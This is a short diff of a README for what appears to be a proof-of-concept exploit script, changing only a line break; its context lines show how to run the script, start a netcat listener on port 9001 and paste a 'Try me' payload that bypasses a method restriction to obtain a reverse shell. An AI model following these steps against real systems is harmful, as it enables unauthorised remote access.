@@ -39,7 +39,7 @@ python poc-csw.py --userip private-ip --webport 8888 --lport 9001 -b methods
 ```
 nc -lvnp 9001
 ```
-3) Copy the 'Try me' payload to bypass methods restriction and use it input variable to get shell in netcat
+3) Copy the 'Try me' payload to bypass methods restriction and use it input variable to get shell in netcat<br>
 ***Note:*** If No bypass is chosen use 'Send me' payload
 ![](images/img2.png)
 ![](images/img3.png)
